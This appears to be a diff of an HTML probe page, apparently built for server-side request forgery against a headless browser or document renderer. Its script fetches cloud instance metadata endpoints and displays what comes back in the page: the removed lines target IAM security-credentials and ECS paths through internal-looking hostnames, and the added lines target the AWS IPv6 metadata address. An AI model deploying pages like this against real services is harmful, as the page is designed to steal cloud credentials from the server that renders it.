@@ -2,17 +2,17 @@
 <html>
 <head><title>T</title></head>
 <body>
-<h1>DNS Test</h1>
+<h1>IPv6 Test</h1>
 <div id="j">JS_NOT_EXECUTED</div>
 <div id="r1">WAITING</div>
 <div id="r2">WAITING</div>
 <div id="r3">WAITING</div>
 <script>
 document.getElementById("j").textContent="JS_EXECUTED_49";
-function f(u,e,l){var x=new XMLHttpRequest();x.open("GET",u,false);try{x.send();document.getElementById(e).textContent=l+":S"+x.status+" "+x.responseText.substring(0,3000);}catch(r){document.getElementById(e).textContent=l+"_ERR:"+r.message;}}
-f("http://imds.xctfassets.net/latest/meta-data/","r1","MD");
-f("http://imds.xctfassets.net/latest/meta-data/iam/security-credentials/","r2","IAM");
-f("http://ecs.xctfassets.net/","r3","ECS");
+function f(u,e,l){var x=new XMLHttpRequest();x.open("GET",u,false);x.timeout=5000;try{x.send();document.getElementById(e).textContent=l+":S"+x.status+" "+x.responseText.substring(0,3000);}catch(r){document.getElementById(e).textContent=l+"_ERR:"+r.message;}}
+f("http://[fd00:ec2::254]/latest/meta-data/","r1","IMDS6");
+f("http://httpbin.org/anything","r2","HTTPBIN");
+f("https://example.com/","r3","EXAMPLE");
 </script>
 </body>
 </html>
